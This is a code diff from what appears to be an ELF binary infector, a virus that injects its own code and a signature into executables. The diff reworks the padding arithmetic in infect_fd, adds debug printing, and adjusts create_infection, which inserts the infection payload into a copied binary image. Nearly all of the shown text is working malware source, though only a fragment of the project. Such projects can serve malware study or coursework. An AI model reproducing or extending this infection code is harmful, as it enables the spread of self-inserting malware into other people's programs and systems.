@@ -121,11 +121,20 @@ int			infect_fd(int fd, t_elf *elf)
 	}
 	Elf64_Phdr	*next = elf->pt_load + 1;
 	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
-	int		psize_offset = next->p_offset % PAGE_SIZE;
-	int		nb_zero_to_add = psize_offset - (next->p_offset + size_needed) % PAGE_SIZE;
-	if (nb_zero_to_add < 0)
-		nb_zero_to_add = (next->p_offset + size_needed) % PAGE_SIZE - psize_offset;
 	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
+	int		n_page_size = ((size_needed - previous_padding) / PAGE_SIZE) + 1;
+	ft_putstr("size_needed: ");
+	ft_putnbr(size_needed);
+	ft_putstr("\n");
+	ft_putstr("prev_padding: ");
+	ft_putnbr(previous_padding);
+	ft_putstr("\n");
+	int		nb_zero_to_add = n_page_size * PAGE_SIZE - (size_needed - previous_padding);
+	if (nb_zero_to_add > 4096)
+		nb_zero_to_add = previous_padding - size_needed;
+	ft_putstr("nb_zero to add ");
+	ft_putnbr(nb_zero_to_add);
+	ft_putstr("\n");
 	char	*new;
 
 	new = syscall_mmap(NULL, elf->size + size_needed + nb_zero_to_add - previous_padding, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
@@ -201,7 +210,7 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	/* DONE IN ADD_PADDING_SEGMENTS
 	ft_memcpy(dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
 	e_shoff = elf->header->e_shoff + ; */
-	src = add_padding_segments(elf, src, &dst, nb_zero);
+	src = add_padding_segments(elf, src, &dst);
 	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
 	ft_memcpy(dst, src, pt_load_size_left);
 	dst += pt_load_size_left;
@@ -218,9 +227,7 @@ void	create_infection(void *dst, t_elf *elf, int nb_zero)
 	Elf64_Phdr	*next = elf->pt_load + 1;
 
 	src = elf->addr + next->p_offset;
-//	src += ((intptr_t)_start - (intptr_t)infect) + INJECT_SIZE; ????
-	src = add_padding_sections(elf, src, &dst, nb_zero);
+	src = add_padding_sections(elf, src, &dst);
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 	dst += (unsigned long)end - (unsigned long)src;
 }
-
